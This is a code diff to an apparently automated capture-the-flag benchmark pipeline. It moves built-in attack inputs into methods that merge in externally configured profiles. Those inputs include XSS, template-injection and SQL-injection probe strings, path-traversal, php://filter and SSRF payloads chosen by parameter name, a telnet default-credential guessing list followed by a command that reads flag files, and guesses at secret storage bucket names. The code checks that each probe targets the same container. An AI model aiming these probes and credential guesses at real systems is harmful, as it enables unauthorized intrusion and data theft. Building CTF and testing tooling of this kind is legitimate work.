@@ -1679,31 +1679,7 @@ class FourPillarPipeline:
         urls = [
             f"{base_url}{path}"
             for base_url in base_urls
-            for path in (
-                "",
-                "robots.txt",
-                "sitemap.xml",
-                "openapi.json",
-                "docs",
-                "login.php",
-                "dashboard.php",
-                "download.php",
-                "upload.php",
-                "flag",
-                "flag.txt",
-                "admin",
-                "api/flag",
-                ".git/config",
-                "backup.zip",
-                "page?name=x%22;alert(%22XSS%22)%3Bfoo=%22",
-                "?name=x%22;alert(%22XSS%22)%3Bfoo=%22",
-                "?name={{{{7*7}}}}",
-                "page?name={{{{7*7}}}}",
-                "search?q=%27%20OR%20%271%27%3D%271",
-                "?id=1%20OR%201=1",
-                "user?id=1",
-                "api/user?id=1",
-            )
+            for path in self._benchmark_probe_paths()
         ]
         outputs: list[str] = []
         root_body = self._benchmark_wait_for_container_ready(base, outputs)
@@ -1785,6 +1761,39 @@ class FourPillarPipeline:
             if raw_output:
                 outputs.append(raw_output)
         return "\n".join(outputs)
+
+    @staticmethod
+    def _benchmark_builtin_probe_paths() -> list[str]:
+        return [
+            "",
+            "robots.txt",
+            "sitemap.xml",
+            "openapi.json",
+            "docs",
+            "login.php",
+            "dashboard.php",
+            "download.php",
+            "upload.php",
+            "flag",
+            "flag.txt",
+            "admin",
+            "api/flag",
+            ".git/config",
+            "backup.zip",
+            "page?name=x%22;alert(%22XSS%22)%3Bfoo=%22",
+            "?name=x%22;alert(%22XSS%22)%3Bfoo=%22",
+            "?name={{{{7*7}}}}",
+            "page?name={{{{7*7}}}}",
+            "search?q=%27%20OR%20%271%27%3D%271",
+            "?id=1%20OR%201=1",
+            "user?id=1",
+            "api/user?id=1",
+        ]
+
+    def _benchmark_probe_paths(self) -> list[str]:
+        data = self._benchmark_external_profiles()
+        external = self._benchmark_string_tuple(data.get("probe_paths"), limit=160)
+        return list(dict.fromkeys(self._benchmark_builtin_probe_paths() + list(external)))
 
     def _benchmark_builtin_service_probe_profiles(self) -> list[dict[str, Any]]:
         return [
@@ -2959,7 +2968,7 @@ class FourPillarPipeline:
                 banner = recv_some()
                 if banner:
                     outputs.append(banner)
-                for command in ("HELP", "SETBODY hello", "BUILD", "QUIT"):
+                for command in self._benchmark_raw_protocol_commands():
                     try:
                         sock.sendall(f"{command}\n".encode("utf-8"))
                     except OSError as exc:
@@ -2972,7 +2981,7 @@ class FourPillarPipeline:
         output = "\n".join(outputs)
         synthetic_content = (
             "命令: raw_text_protocol_probe "
-            f"{addr} HELP SETBODY BUILD QUIT\n"
+            f"{addr} {' '.join(self._benchmark_raw_protocol_commands())}\n"
             "工作目录: /home/my/cyber/benchmark_test\n"
             "退出码: 0\n"
             "输出:\n"
@@ -2988,6 +2997,11 @@ class FourPillarPipeline:
                 metadata={"challenge": code},
             )
         return output
+
+    def _benchmark_raw_protocol_commands(self) -> tuple[str, ...]:
+        data = self._benchmark_external_profiles()
+        external = self._benchmark_string_tuple(data.get("raw_protocol_commands"), limit=30)
+        return tuple(dict.fromkeys(("HELP", "SETBODY hello", "BUILD", "QUIT") + external))
 
     @staticmethod
     def _benchmark_telnet_plain_and_reply(data: bytes) -> tuple[str, bytes]:
@@ -3050,21 +3064,8 @@ class FourPillarPipeline:
 
         detected = self._benchmark_detect_tun_local()
         source_ip = detected[1] if detected else ""
-        credentials = (
-            ("root", "root"),
-            ("root", "password"),
-            ("root", "toor"),
-            ("admin", "admin"),
-            ("admin", "password"),
-            ("user", "user"),
-            ("guest", "guest"),
-            ("ctf", "ctf"),
-            ("test", "test"),
-        )
-        flag_command = (
-            "cat /challenge/flag.txt /flag /flag.txt /root/flag "
-            "/root/flag.txt 2>/dev/null\n"
-        )
+        credentials = self._benchmark_telnet_credentials()
+        flag_command = self._benchmark_telnet_flag_command()
         outputs: list[str] = [f"## telnet-login {addr}"]
         for username, password in credentials:
             session_text = ""
@@ -3114,6 +3115,31 @@ class FourPillarPipeline:
             if code in completed or "flag{" in session_text.lower():
                 break
         return "\n".join(outputs)
+
+    def _benchmark_telnet_credentials(self) -> tuple[tuple[str, str], ...]:
+        data = self._benchmark_external_profiles()
+        external = self._benchmark_string_pair_tuple(data.get("telnet_credentials"), limit=30)
+        return tuple(dict.fromkeys((
+            ("root", "root"),
+            ("root", "password"),
+            ("root", "toor"),
+            ("admin", "admin"),
+            ("admin", "password"),
+            ("user", "user"),
+            ("guest", "guest"),
+            ("ctf", "ctf"),
+            ("test", "test"),
+        ) + external))
+
+    def _benchmark_telnet_flag_command(self) -> str:
+        data = self._benchmark_external_profiles()
+        raw = str(data.get("telnet_flag_command") or "").strip()
+        if raw:
+            return raw[:400] + ("\n" if not raw.endswith("\n") else "")
+        return (
+            "cat /challenge/flag.txt /flag /flag.txt /root/flag "
+            "/root/flag.txt 2>/dev/null\n"
+        )
 
     def _benchmark_probe_handoff_followup_local(self, code: str, addrs: list[str]) -> str:
         if not addrs:
@@ -3255,10 +3281,13 @@ class FourPillarPipeline:
 
     def _benchmark_text_path_probe_urls(self, base: str, text: str) -> list[str]:
         urls: list[str] = []
-        for raw in _re_mod.findall(r"/(?:api|admin|flag|config|internal)[A-Za-z0-9_./-]{0,160}", text):
-            url = _urljoin(base, raw)
-            if self._benchmark_url_is_same_container(base, url):
-                urls.append(url)
+        prefixes = self._benchmark_text_path_prefixes()
+        if prefixes:
+            prefix_pattern = "|".join(_re_mod.escape(prefix.strip("/")) for prefix in prefixes)
+            for raw in _re_mod.findall(rf"/(?:{prefix_pattern})[A-Za-z0-9_./-]{{0,160}}", text):
+                url = _urljoin(base, raw)
+                if self._benchmark_url_is_same_container(base, url):
+                    urls.append(url)
         lowered = text.lower()
         if "/api/functions" in lowered:
             urls.append(_urljoin(base, "api/functions"))
@@ -3266,6 +3295,16 @@ class FourPillarPipeline:
             for name in _re_mod.findall(r'"name"\s*:\s*"([A-Za-z0-9_.-]{1,80})"', text):
                 urls.append(_urljoin(base, f"api/functions/{name}/config"))
         return list(dict.fromkeys(urls))[:40]
+
+    def _benchmark_text_path_prefixes(self) -> tuple[str, ...]:
+        data = self._benchmark_external_profiles()
+        external = self._benchmark_string_tuple(data.get("text_path_prefixes"), limit=80)
+        return tuple(
+            dict.fromkeys(
+                ("api", "admin", "flag", "config", "internal")
+                + external
+            )
+        )
 
     def _benchmark_object_storage_probe_urls(
         self,
@@ -3300,7 +3339,25 @@ class FourPillarPipeline:
             key for key in _re_mod.findall(r"<Key>([^<]{1,240})</Key>", html)
             if not key.startswith("/")
         ]
-        common_buckets = [
+        common_buckets = self._benchmark_object_storage_buckets()
+        buckets = sorted(discovered_buckets) + [
+            bucket for bucket in common_buckets
+            if bucket not in discovered_buckets
+        ]
+        keys = self._benchmark_object_storage_keys()
+        urls: list[str] = []
+        for bucket in buckets:
+            for key in keys:
+                path = f"{bucket}/" if not key else f"{bucket}/{key}"
+                urls.append(_urljoin(base, path))
+            for key in listed_keys:
+                urls.append(_urljoin(base, f"{bucket}/{key}"))
+        return urls[:30]
+
+    def _benchmark_object_storage_buckets(self) -> list[str]:
+        data = self._benchmark_external_profiles()
+        external = self._benchmark_string_tuple(data.get("object_storage_buckets"), limit=80)
+        return list(dict.fromkeys(list(external) + [
             "company-secrets",
             "secret-data",
             "secret",
@@ -3311,12 +3368,12 @@ class FourPillarPipeline:
             "flags",
             "backup",
             "backups",
-        ]
-        buckets = sorted(discovered_buckets) + [
-            bucket for bucket in common_buckets
-            if bucket not in discovered_buckets
-        ]
-        keys = (
+        ]))
+
+    def _benchmark_object_storage_keys(self) -> tuple[str, ...]:
+        data = self._benchmark_external_profiles()
+        external = self._benchmark_string_tuple(data.get("object_storage_keys"), limit=120)
+        return tuple(dict.fromkeys(external + (
             "",
             "flag",
             "flag.txt",
@@ -3328,15 +3385,7 @@ class FourPillarPipeline:
             "backup.zip",
             "README.md",
             "README.txt",
-        )
-        urls: list[str] = []
-        for bucket in buckets:
-            for key in keys:
-                path = f"{bucket}/" if not key else f"{bucket}/{key}"
-                urls.append(_urljoin(base, path))
-            for key in listed_keys:
-                urls.append(_urljoin(base, f"{bucket}/{key}"))
-        return urls[:30]
+        )))
 
     @staticmethod
     def _benchmark_url_is_same_container(base: str, url: str) -> bool:
@@ -3363,29 +3412,54 @@ class FourPillarPipeline:
             for payload in self._benchmark_payloads_for_param(name)
         ]
 
-    @staticmethod
-    def _benchmark_payloads_for_param(name: str) -> list[str]:
+    def _benchmark_payloads_for_param(self, name: str) -> list[str]:
         lowered = name.lower()
+        payloads: list[str] = []
         if any(part in lowered for part in ("file", "path", "page", "template", "view", "filename")):
-            return [
+            payloads.extend([
                 "../flag",
                 "../../flag",
                 "../../../../flag",
                 "/flag",
                 "php://filter/convert.base64-encode/resource=index.php",
-            ]
+            ])
         if any(part in lowered for part in ("url", "uri", "redirect", "next", "target", "return")):
-            return [
+            payloads.extend([
                 "file:///flag",
                 "http://127.0.0.1/flag",
                 "http://localhost/flag",
                 "http://0.0.0.0/flag",
-            ]
+            ])
         if lowered in {"id", "uid", "user", "user_id", "account", "post", "pid"} or lowered.endswith("_id"):
-            return ["1 OR 1=1", "1' OR '1'='1", "0", "../flag"]
+            payloads.extend(["1 OR 1=1", "1' OR '1'='1", "0", "../flag"])
         if any(part in lowered for part in ("name", "q", "query", "search", "keyword", "message")):
-            return ["{{7*7}}", "${7*7}", "' OR '1'='1", _url_quote("<script>alert(1)</script>")]
-        return ["{{7*7}}", "' OR '1'='1", "../flag"]
+            payloads.extend(["{{7*7}}", "${7*7}", "' OR '1'='1", _url_quote("<script>alert(1)</script>")])
+        if not payloads:
+            payloads.extend(["{{7*7}}", "' OR '1'='1", "../flag"])
+        payloads.extend(self._benchmark_external_payloads_for_param(lowered))
+        return list(dict.fromkeys(payloads))
+
+    def _benchmark_external_payloads_for_param(self, lowered_name: str) -> list[str]:
+        data = self._benchmark_external_profiles()
+        raw_profiles = data.get("param_payload_profiles", data.get("payload_profiles", []))
+        if not isinstance(raw_profiles, list):
+            return []
+        payloads: list[str] = []
+        for raw in raw_profiles[:80]:
+            if not isinstance(raw, dict):
+                continue
+            exact = self._benchmark_string_tuple(raw.get("name_exact"), limit=40)
+            contains = self._benchmark_string_tuple(raw.get("name_contains"), limit=40)
+            suffixes = self._benchmark_string_tuple(raw.get("name_suffix"), limit=40)
+            matched = (
+                lowered_name in {item.lower() for item in exact}
+                or any(item.lower() in lowered_name for item in contains)
+                or any(lowered_name.endswith(item.lower()) for item in suffixes)
+            )
+            if not matched:
+                continue
+            payloads.extend(self._benchmark_string_tuple(raw.get("payloads"), limit=40))
+        return payloads
 
     def _benchmark_builtin_service_action_profiles(self) -> dict[str, dict[str, Any]]:
         return {
